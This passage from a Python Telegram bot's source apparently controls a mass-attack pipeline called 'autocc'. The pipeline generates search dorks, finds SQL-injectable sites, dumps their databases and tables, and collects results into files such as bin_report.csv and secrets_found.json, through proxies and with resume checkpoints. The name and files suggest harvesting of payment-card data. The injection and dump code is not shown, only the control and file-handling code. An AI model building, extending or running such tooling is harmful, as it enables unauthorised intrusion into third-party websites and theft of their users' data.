        return f"⚠️ `{label}` — khaali hai"
    return f"✅ `{label}` — {n} lines ({size})"


async def show_status(update):
    rows = ["📊 *status*"]
    for f in ["keywords.txt", "urls.txt", "targets.txt", "injectable.txt",
              "dbs.txt", "tables.txt", "parsed.csv", "validated.csv",
              "final.csv", "bin_report.csv", "secrets_found.json"]:
        rows.append(_status_row(RAW / f))
    dorks = sorted(RAW.glob("dorks_*.txt"))
    if dorks:
        n = sum(len(p.read_text(errors="ignore").splitlines()) for p in dorks)
        rows.append(f"✅ `dorks_*.txt` — {len(dorks)} files, {n} lines")
    else:
        rows.append("❌ `dorks_*.txt`")
    rows.append(_status_row(
        Path(CFG.get("proxies", {}).get("file", "./data/proxies.txt")),
        "proxies.txt"))
    rows.append(_status_row(FINAL / "bundle.zip"))
    cp = RAW / ".sqli_checkpoint.json"
    if cp.exists():
        try:
            d = json.loads(cp.read_text())
            rows.append(f"📍 `resume` — {len(d.get('done', []))} done, "
                        f"{len(d.get('found', []))} injectables "
                        f"(dobara bhejo to wahin se continue)")
        except Exception:
            rows.append("📍 `resume` — checkpoint hai")
    await post(update, "\n".join(rows), ui.STATUS)


def _removable_files():
    files = []
    for name in ["keywords.txt", "urls.txt", "targets.txt", "injectable.txt",
                 "dbs.txt", "tables.txt", "parsed.csv", "validated.csv",
                 "final.csv", "bin_report.csv", "secrets_found.json"]:
        p = RAW / name
        if p.exists():
            files.append(p)
    files += sorted(RAW.glob("dorks_*.txt"))
    bp = Path(CFG.get("proxies", {}).get("file", "./data/proxies.txt"))
    if bp.exists():
        files.append(bp)
    bz = FINAL / "bundle.zip"
    if bz.exists():
        files.append(bz)
    ck = RAW / ".sqli_checkpoint.json"
    if ck.exists():
        files.append(ck)  # delete karne se agla scan fresh shuru hoga
    return files


async def ask_remove(update):
    from telegram import ReplyKeyboardMarkup, KeyboardButton
    chat = update.effective_chat.id
    cands = _removable_files()
    if not cands:
        return await post(update, "kuch delete karne layak nahi hai 🙂",
                          ui.STATUS)
    REMOVE_CANDIDATES[chat] = cands
    names = [p.name for p in cands]
    kb_rows = [names[i:i+2] for i in range(0, len(names), 2)]
    kb_rows.append(["🗑 Remove ALL"])
    kb_rows.append(["📊 Status", "⬅️ Back"])
    kb = ReplyKeyboardMarkup([[KeyboardButton(x) for x in r] for r in kb_rows],
                             resize_keyboard=True)
    await post(update,
               "🗑 *kaunsi file delete karun?*\n(naam pe tap karo)",
               kb)


async def do_remove_file(update, name):
    chat = update.effective_chat.id
    cands = REMOVE_CANDIDATES.get(chat, [])
    match = next((p for p in cands if p.name == name), None)
    if not match or not match.exists():
        return await post(update, "wo file ab nahi hai.", ui.STATUS)
    try:
        match.unlink()
        fc = FILECACHE.get(chat, {})
        if fc.get("dorks") == str(match):
            fc.pop("dorks", None)
        LOG.info(f"[bot] removed {match}")
    except Exception as e:
        return await post(update, f"❌ delete nahi hui: {e}", ui.STATUS)
    REMOVE_CANDIDATES[chat] = _removable_files()
    await post(update, f"🗑 `{name}` delete ho gayi.")
    return await show_status(update)


async def do_remove_all(update):
    chat = update.effective_chat.id
    cands = REMOVE_CANDIDATES.get(chat, [])
    n, failed = 0, []
    for p in cands:
        try:
            if p.exists():
                p.unlink()
                n += 1
        except Exception:
            failed.append(p.name)
    fc = FILECACHE.get(chat, {})
    fc.pop("dorks", None)
    LOG.info(f"[bot] removed all ({n} files)")
    REMOVE_CANDIDATES[chat] = []
    msg = f"🗑 *{n}* files delete ho gayi."
    if failed:
        msg += f"\n❌ nahi hui: {', '.join(failed)}"
    await post(update, msg)
    return await show_status(update)


async def show_full_status(update):
    lines = ["📈 *full report*"]
    for f in sorted(RAW.glob("*")):
        if f.is_file():
            lines.append(f"`{f.name}` — {len(f.read_text(errors='ignore').splitlines())}")
    lines.append("\n*final:*")
    for f in sorted(FINAL.glob("*")):
        if f.is_file():
            lines.append(f"`{f.name}` — {f.stat().st_size} B")
    await post(update, "\n".join(lines), ui.STATUS)


async def do_fetch(update, label):
    base = FINAL / CFG["output"]["base_name"]
    if label == "📦 Send All":
        files = [f for f in FINAL.iterdir() if f.is_file()]
    else:
        ext = label.split(".")[-1]
        files = [base.with_suffix("." + ext)]
    sent = 0
    for f in files:
        if await send_file(update, f):
            sent += 1
    await post(update, f"📥 sent {sent} file(s).", ui.FETCH)


HELP_TEXT = {
    "🔑 Keywords": "🔑 *keywords* — pick count, send base word → keywords.txt",
    "🎯 Dorks":    "🎯 *dorks* — keywords file bhejo → dork files",
    "🌐 Parser":   "🌐 *parser* — dork file bhejo → urls.txt + targets.txt",
    "💉 SQLi":     "💉 *sqli* — targets file bhejo → injectable.txt",
    "📦 Dump":     "📦 *dump* — injectable file bhejo → dump csv",
    "✅ Validate": "✅ *validate* — parsed.csv bhejo → validated.csv",
    "🧹 Dedupe":   "🧹 *dedupe* — validated.csv bhejo → final.csv",
    "📤 Output":   "📤 *output* — final.csv bhejo → final.txt/.csv/.json",
}


# ─── main ─────────────────────────────────────────────────────────────
def main():
    # NOTE: 30s timeouts for slow egress proxy — required in this environment
    # NOTE: concurrent_updates=True taaki /kill jaise commands
    #       lambe stages (parse/sqli/dump) ke dauraan bhi chalen
    app = (
        Application.builder()
        .token(CFG["telegram"]["token"])
        .request(HTTPXRequest(connect_timeout=30, read_timeout=30,
                             write_timeout=30, pool_timeout=30))
        .concurrent_updates(True)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("kill", cmd_kill))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND,
                                  on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("autocc ui v5 running — file-driven pipeline, file in -> file out.")
    app.run_polling()


if __name__ == "__main__":
    main()
